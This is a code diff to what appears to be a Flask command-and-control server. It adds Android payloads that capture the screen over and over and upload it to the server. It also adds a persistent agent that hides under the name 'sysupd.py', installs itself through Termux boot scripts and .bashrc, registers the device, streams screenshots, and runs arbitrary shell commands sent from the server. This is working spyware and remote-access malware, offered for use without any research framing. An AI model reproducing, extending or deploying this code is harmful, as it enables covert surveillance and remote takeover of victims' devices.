@@ -110,7 +110,8 @@ def api_screenshot():
         img_bytes = base64.b64decode(img_b64)
     except Exception:
         return jsonify({"error": "bad image data"}), 500
-    resp = Response(img_bytes, mimetype="image/jpeg")
+    mime = "image/png" if img_bytes[:4] == b'\x89PNG' else "image/jpeg"
+    resp = Response(img_bytes, mimetype=mime)
     resp.headers["Cache-Control"] = "no-store"
     return resp
 
@@ -258,6 +259,47 @@ if os.path.isfile(f) and os.path.getsize(f)>100:
     d=open(f,'rb').read();os.unlink(f)
     body=json.dumps({{'img':base64.b64encode(d).decode(),'os':'Darwin'}}).encode()
     {post}
+"""
+    return Response(script, mimetype="text/plain; charset=utf-8")
+
+
+@app.route("/sh/android")
+def sh_android():
+    u = _base_url()
+    post = _post_snippet_py(u)
+    script = f"""#!/usr/bin/env python3
+import subprocess,base64,urllib.request,json,os
+td=os.environ.get('TMPDIR','/data/data/com.termux/files/usr/tmp')
+f=os.path.join(td,'ss.png')
+r=subprocess.run(['screencap','-p',f],capture_output=True,timeout=5)
+if r.returncode!=0:subprocess.run(['termux-screenshot','-q',f],capture_output=True,timeout=10)
+if os.path.isfile(f) and os.path.getsize(f)>100:
+    d=open(f,'rb').read();os.unlink(f)
+    body=json.dumps({{'img':base64.b64encode(d).decode(),'os':'Android'}}).encode()
+    {post}
+"""
+    return Response(script, mimetype="text/plain; charset=utf-8")
+
+
+@app.route("/sh/android-live")
+def sh_android_live():
+    u = _base_url()
+    post = _post_snippet_py(u)
+    script = f"""#!/usr/bin/env python3
+import subprocess,base64,urllib.request,json,os,time
+td=os.environ.get('TMPDIR','/data/data/com.termux/files/usr/tmp')
+while True:
+    try:
+        if json.loads(urllib.request.urlopen('{u}/api/live-stop',timeout=3).read()).get('stop'):break
+    except:pass
+    f=os.path.join(td,'ss.png')
+    r=subprocess.run(['screencap','-p',f],capture_output=True,timeout=5)
+    if r.returncode!=0:subprocess.run(['termux-screenshot','-q',f],capture_output=True,timeout=10)
+    if os.path.isfile(f) and os.path.getsize(f)>100:
+        d=open(f,'rb').read();os.unlink(f)
+        body=json.dumps({{'img':base64.b64encode(d).decode(),'os':'Android'}}).encode()
+        {post}
+    time.sleep(2)
 """
     return Response(script, mimetype="text/plain; charset=utf-8")
 
@@ -806,6 +848,95 @@ while True:
     time.sleep(2)
 """
 
+_PERSIST_ANDROID = r"""#!/usr/bin/env python3
+import urllib.request,json,subprocess,base64,socket,os,time,sys,uuid,shutil
+R='__RELAY__'
+HOME=os.path.expanduser('~')
+ID_F=os.path.join(HOME,'.xaid');AP=os.path.join(HOME,'sysupd.py')
+DID=open(ID_F).read().strip() if os.path.exists(ID_F) else str(uuid.uuid4())
+if not os.path.exists(ID_F):open(ID_F,'w').write(DID)
+if os.path.realpath(sys.argv[0])!=AP:
+    try:shutil.copy2(sys.argv[0],AP);os.chmod(AP,0o700)
+    except:
+        try:urllib.request.urlretrieve(R+'/sh/persist-android',AP);os.chmod(AP,0o700)
+        except:pass
+    try:
+        bd=os.path.expanduser('~/.termux/boot');os.makedirs(bd,exist_ok=True)
+        bs=os.path.join(bd,'agent.sh')
+        open(bs,'w').write('#!/data/data/com.termux/files/usr/bin/bash\npython3 '+AP+' 2>/dev/null &\n')
+        os.chmod(bs,0o700)
+    except:pass
+    try:
+        rc=os.path.expanduser('~/.bashrc');ex=open(rc).read() if os.path.exists(rc) else ''
+        e='python3 '+AP+' 2>/dev/null &\n'
+        if e not in ex:open(rc,'a').write(e)
+    except:pass
+def post(ep,d):
+    try:
+        b=json.dumps(d).encode();req=urllib.request.Request(R+ep,b,{'Content-Type':'application/json'})
+        urllib.request.urlopen(req,timeout=15)
+    except:pass
+def get_(ep):
+    try:return json.loads(urllib.request.urlopen(R+ep,timeout=8).read())
+    except:return {}
+def shot():
+    try:
+        td=os.environ.get('TMPDIR','/data/data/com.termux/files/usr/tmp')
+        f=os.path.join(td,'ss.png')
+        r=subprocess.run(['screencap','-p',f],capture_output=True,timeout=5)
+        if r.returncode!=0 or not os.path.isfile(f) or os.path.getsize(f)<100:
+            subprocess.run(['termux-screenshot','-q',f],capture_output=True,timeout=10)
+        if os.path.isfile(f) and os.path.getsize(f)>100:
+            d=open(f,'rb').read();os.unlink(f);return base64.b64encode(d).decode()
+    except:pass
+    return ''
+try:ip=socket.gethostbyname(socket.gethostname())
+except:ip='?'
+OS='Android'
+try:
+    rv=subprocess.run(['getprop','ro.build.version.release'],capture_output=True,text=True,timeout=3)
+    if rv.stdout.strip():OS='Android '+rv.stdout.strip()
+except:pass
+post('/esp/device-register',{'did':DID,'hostname':socket.gethostname(),'os':OS,'user':os.environ.get('USER','termux'),'ip':ip,'arch':os.uname().machine,'persistent':True})
+lid=0;lst=0;lreg=time.time()
+while True:
+    try:
+        if time.time()-lreg>30:
+            post('/esp/device-register',{'did':DID,'hostname':socket.gethostname(),'os':OS,'user':'termux','ip':ip,'persistent':True});lreg=time.time()
+        if time.time()-lst>3:
+            img=shot()
+            if img:post('/esp/device-screenshot',{'did':DID,'img':img,'os':OS})
+            lst=time.time()
+        p=get_('/esp/device-cmd?did='+DID)
+        if p.get('cmd') and p.get('id',0)!=lid:
+            lid=p['id'];cmd=p['cmd']
+            if cmd=='__uninstall__':
+                try:
+                    bs=os.path.expanduser('~/.termux/boot/agent.sh')
+                    if os.path.exists(bs):os.remove(bs)
+                except:pass
+                try:
+                    rc=os.path.expanduser('~/.bashrc')
+                    if os.path.exists(rc):
+                        content=open(rc).read()
+                        content=content.replace('python3 '+AP+' 2>/dev/null &\n','')
+                        open(rc,'w').write(content)
+                except:pass
+                post('/esp/device-cmdout',{'did':DID,'cmd':cmd,'out':base64.b64encode(b'Uninstalled').decode()})
+                time.sleep(1)
+                try:os.remove(AP);os.remove(ID_F)
+                except:pass
+                sys.exit(0)
+            try:
+                r=subprocess.run(cmd,shell=True,capture_output=True,timeout=30)
+                out=base64.b64encode(r.stdout+r.stderr).decode()
+            except Exception as e:out=base64.b64encode(('Error: '+str(e)).encode()).decode()
+            post('/esp/device-cmdout',{'did':DID,'cmd':cmd,'out':out,'os':OS})
+    except KeyboardInterrupt:sys.exit(0)
+    except:pass
+    time.sleep(2)
+"""
+
 _PERSIST_MAC = r"""#!/usr/bin/env python3
 import urllib.request,json,subprocess,base64,platform,socket,os,time,sys,uuid,tempfile,shutil
 R='__RELAY__'
@@ -893,6 +1024,11 @@ def sh_persist_linux():
 def sh_persist_mac():
     u = _base_url()
     return Response(_PERSIST_MAC.replace("__RELAY__", u), mimetype="text/plain; charset=utf-8")
+
+@app.route("/sh/persist-android")
+def sh_persist_android():
+    u = _base_url()
+    return Response(_PERSIST_ANDROID.replace("__RELAY__", u), mimetype="text/plain; charset=utf-8")
 
 # ── Multi-device persistent agent endpoints ──────────────────────────────────
 
@@ -984,7 +1120,8 @@ def api_device_screenshot(did):
         img_bytes = base64.b64decode(img_b64)
     except Exception:
         return jsonify({"error": "bad image data"}), 500
-    resp = Response(img_bytes, mimetype="image/jpeg")
+    mime = "image/png" if img_bytes[:4] == b'\x89PNG' else "image/jpeg"
+    resp = Response(img_bytes, mimetype=mime)
     resp.headers["Cache-Control"] = "no-store"
     return resp
 
